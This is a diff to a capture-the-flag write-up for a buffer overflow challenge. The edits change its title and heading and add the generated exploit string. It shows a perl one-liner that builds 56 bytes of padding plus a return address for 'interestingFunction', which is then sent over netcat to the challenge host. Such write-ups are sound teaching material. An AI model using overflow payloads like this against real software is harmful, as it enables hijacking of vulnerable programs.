@@ -1,6 +1,6 @@
-cd # Challenge Name
+lcd # Challenge Name
 
-## Stolen
+## Exploded
 
 Here's a program that I made. Seems like it works the way I want it to.
 
@@ -73,6 +73,8 @@ End of assembler dump.
 Thus, our exploit string can be generated with the follow command, account for the 56 bytes we need to write and the address of `interestingFunction` after the first line.
 
 `perl -e 'print "a"x56 . "\x48\x49\x55\x55\x55\x55\x00\x00"'`
+
+This gives us the string `aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaHIUUUU`.
 
 With the string generated from the above, we can run `nc <hostname> <port>` and enter the string as input to get the flag.
 
